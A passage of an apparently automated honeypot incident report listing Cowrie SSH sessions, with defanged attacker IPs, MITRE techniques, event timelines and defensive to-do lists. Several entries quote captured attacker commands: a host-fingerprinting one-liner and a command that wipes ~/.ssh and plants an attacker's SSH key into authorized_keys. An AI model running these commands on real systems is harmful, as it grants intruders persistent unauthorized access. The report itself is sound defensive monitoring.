| `2026-08-13 11:49:56` | `cowrie.client.kex` |
| `2026-08-13 11:49:56` | `cowrie.login.success` |
| `2026-08-13 11:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ec363473ad1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-13 11:49 |
| **Last Seen** | 2026-08-13 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:49:56` | `cowrie.session.connect` |
| `2026-08-13 11:49:56` | `cowrie.client.version` |
| `2026-08-13 11:49:56` | `cowrie.client.kex` |
| `2026-08-13 11:49:57` | `cowrie.login.success` |
| `2026-08-13 11:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b1b308188d7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-13 11:50 |
| **Last Seen** | 2026-08-13 11:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:50:03` | `cowrie.session.connect` |
| `2026-08-13 11:50:03` | `cowrie.client.version` |
| `2026-08-13 11:50:03` | `cowrie.client.kex` |
| `2026-08-13 11:50:03` | `cowrie.login.success` |
| `2026-08-13 11:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-003ead3c258c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-13 11:50 |
| **Last Seen** | 2026-08-13 11:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:50:03` | `cowrie.session.connect` |
| `2026-08-13 11:50:03` | `cowrie.client.version` |
| `2026-08-13 11:50:03` | `cowrie.client.kex` |
| `2026-08-13 11:50:03` | `cowrie.login.success` |
| `2026-08-13 11:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-636d2180ce1e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:06 |
| **Last Seen** | 2026-08-13 12:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:06:25` | `cowrie.session.connect` |
| `2026-08-13 12:06:25` | `cowrie.client.version` |
| `2026-08-13 12:06:25` | `cowrie.client.kex` |
| `2026-08-13 12:06:29` | `cowrie.login.success` |
| `2026-08-13 12:06:31` | `cowrie.session.params` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:31` | `cowrie.command.success` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:31` | `cowrie.command.input` |
| `2026-08-13 12:06:32` | `cowrie.log.closed` |
| `2026-08-13 12:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b568f72f45bb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:09 |
| **Last Seen** | 2026-08-13 12:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:09:16` | `cowrie.session.connect` |
| `2026-08-13 12:09:17` | `cowrie.client.version` |
| `2026-08-13 12:09:17` | `cowrie.client.kex` |
| `2026-08-13 12:09:21` | `cowrie.login.success` |
| `2026-08-13 12:09:23` | `cowrie.session.params` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:23` | `cowrie.command.success` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:23` | `cowrie.command.input` |
| `2026-08-13 12:09:24` | `cowrie.log.closed` |
| `2026-08-13 12:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83cee92fce8a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:11 |
| **Last Seen** | 2026-08-13 12:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:11:53` | `cowrie.session.connect` |
| `2026-08-13 12:11:53` | `cowrie.client.version` |
| `2026-08-13 12:11:53` | `cowrie.client.kex` |
| `2026-08-13 12:11:57` | `cowrie.login.success` |
| `2026-08-13 12:11:59` | `cowrie.session.params` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:11:59` | `cowrie.command.success` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:11:59` | `cowrie.command.input` |
| `2026-08-13 12:12:00` | `cowrie.log.closed` |
| `2026-08-13 12:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19f9e0f4377e

| Field | Detail |
|---|---|
| **Source IP** | `179.40.112[.]10` |
| **First Seen** | 2026-08-13 12:14 |
| **Last Seen** | 2026-08-13 12:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:14:10` | `cowrie.session.connect` |
| `2026-08-13 12:14:10` | `cowrie.client.version` |
| `2026-08-13 12:14:11` | `cowrie.client.kex` |
| `2026-08-13 12:14:11` | `cowrie.login.success` |
| `2026-08-13 12:14:12` | `cowrie.session.params` |
| `2026-08-13 12:14:12` | `cowrie.command.input` |
| `2026-08-13 12:14:12` | `cowrie.command.failed` |
| `2026-08-13 12:14:12` | `cowrie.log.closed` |
| `2026-08-13 12:14:13` | `cowrie.session.params` |
| `2026-08-13 12:14:13` | `cowrie.command.input` |
| `2026-08-13 12:14:13` | `cowrie.session.file_download` |
| `2026-08-13 12:14:13` | `cowrie.log.closed` |
| `2026-08-13 12:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.40.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `179.40.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d572cfff4d3c

| Field | Detail |
|---|---|
| **Source IP** | `179.40.112[.]10` |
| **First Seen** | 2026-08-13 12:14 |
| **Last Seen** | 2026-08-13 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:14:13` | `cowrie.session.connect` |
| `2026-08-13 12:14:13` | `cowrie.client.version` |
| `2026-08-13 12:14:14` | `cowrie.client.kex` |
| `2026-08-13 12:14:14` | `cowrie.login.success` |
| `2026-08-13 12:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.40.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `179.40.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12cd13062668

| Field | Detail |
|---|---|
| **Source IP** | `179.40.112[.]10` |
| **First Seen** | 2026-08-13 12:14 |
| **Last Seen** | 2026-08-13 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:14:14` | `cowrie.session.connect` |
| `2026-08-13 12:14:14` | `cowrie.client.version` |
| `2026-08-13 12:14:15` | `cowrie.client.kex` |
| `2026-08-13 12:14:15` | `cowrie.login.success` |
| `2026-08-13 12:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.40.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `179.40.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4061e8e93d9e

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]51` |
| **First Seen** | 2026-08-13 12:15 |
| **Last Seen** | 2026-08-13 12:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:15:17` | `cowrie.session.connect` |
| `2026-08-13 12:15:18` | `cowrie.client.version` |
| `2026-08-13 12:15:18` | `cowrie.client.kex` |
| `2026-08-13 12:15:20` | `cowrie.login.success` |
| `2026-08-13 12:15:21` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]51` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-960dd7047c92

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:16 |
| **Last Seen** | 2026-08-13 12:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:16:49` | `cowrie.session.connect` |
| `2026-08-13 12:16:49` | `cowrie.client.version` |
| `2026-08-13 12:16:49` | `cowrie.client.kex` |
| `2026-08-13 12:16:52` | `cowrie.login.success` |
| `2026-08-13 12:16:54` | `cowrie.session.params` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:54` | `cowrie.command.success` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:54` | `cowrie.command.input` |
| `2026-08-13 12:16:55` | `cowrie.log.closed` |
| `2026-08-13 12:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6738c935180

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-08-13 12:18 |
| **Last Seen** | 2026-08-13 12:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:18:23` | `cowrie.session.connect` |
| `2026-08-13 12:18:23` | `cowrie.client.version` |
| `2026-08-13 12:18:23` | `cowrie.client.kex` |
| `2026-08-13 12:18:24` | `cowrie.login.success` |
| `2026-08-13 12:18:25` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00f8456a61d

| Field | Detail |
|---|---|
| **Source IP** | `203.192.247[.]84` |
| **First Seen** | 2026-08-13 12:18 |
| **Last Seen** | 2026-08-13 12:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:18:34` | `cowrie.session.connect` |
| `2026-08-13 12:18:35` | `cowrie.client.version` |
| `2026-08-13 12:18:35` | `cowrie.client.kex` |
| `2026-08-13 12:18:37` | `cowrie.login.success` |
| `2026-08-13 12:18:38` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.247[.]84` to AbuseIPDB if not already reported
- [ ] Block `203.192.247[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca577631efa

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:19 |
| **Last Seen** | 2026-08-13 12:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:19:27` | `cowrie.session.connect` |
| `2026-08-13 12:19:28` | `cowrie.client.version` |
| `2026-08-13 12:19:28` | `cowrie.client.kex` |
| `2026-08-13 12:19:30` | `cowrie.login.success` |
| `2026-08-13 12:19:32` | `cowrie.session.params` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:32` | `cowrie.command.success` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:32` | `cowrie.command.input` |
| `2026-08-13 12:19:33` | `cowrie.log.closed` |
| `2026-08-13 12:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f0ee8590b2

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-08-13 12:20 |
| **Last Seen** | 2026-08-13 12:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:20:46` | `cowrie.session.connect` |
| `2026-08-13 12:20:46` | `cowrie.client.version` |
| `2026-08-13 12:20:47` | `cowrie.client.kex` |
| `2026-08-13 12:20:48` | `cowrie.login.success` |
| `2026-08-13 12:20:49` | `cowrie.session.params` |
| `2026-08-13 12:20:49` | `cowrie.command.input` |
| `2026-08-13 12:20:49` | `cowrie.command.failed` |
| `2026-08-13 12:20:49` | `cowrie.log.closed` |
| `2026-08-13 12:20:50` | `cowrie.session.params` |
| `2026-08-13 12:20:50` | `cowrie.command.input` |
| `2026-08-13 12:20:51` | `cowrie.session.file_download` |
| `2026-08-13 12:20:51` | `cowrie.log.closed` |
| `2026-08-13 12:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b927dcf8f9

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-08-13 12:20 |
| **Last Seen** | 2026-08-13 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:20:51` | `cowrie.session.connect` |
| `2026-08-13 12:20:51` | `cowrie.client.version` |
| `2026-08-13 12:20:51` | `cowrie.client.kex` |
| `2026-08-13 12:20:52` | `cowrie.login.success` |
| `2026-08-13 12:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd8cabe0816

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-08-13 12:20 |
| **Last Seen** | 2026-08-13 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:20:53` | `cowrie.session.connect` |
| `2026-08-13 12:20:53` | `cowrie.client.version` |
| `2026-08-13 12:20:53` | `cowrie.client.kex` |
| `2026-08-13 12:20:54` | `cowrie.login.success` |
| `2026-08-13 12:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5867fa850c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:21 |
| **Last Seen** | 2026-08-13 12:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:21:50` | `cowrie.session.connect` |
| `2026-08-13 12:21:51` | `cowrie.client.version` |
| `2026-08-13 12:21:51` | `cowrie.client.kex` |
| `2026-08-13 12:21:53` | `cowrie.login.success` |
| `2026-08-13 12:21:55` | `cowrie.session.params` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.command.success` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.command.input` |
| `2026-08-13 12:21:55` | `cowrie.log.closed` |
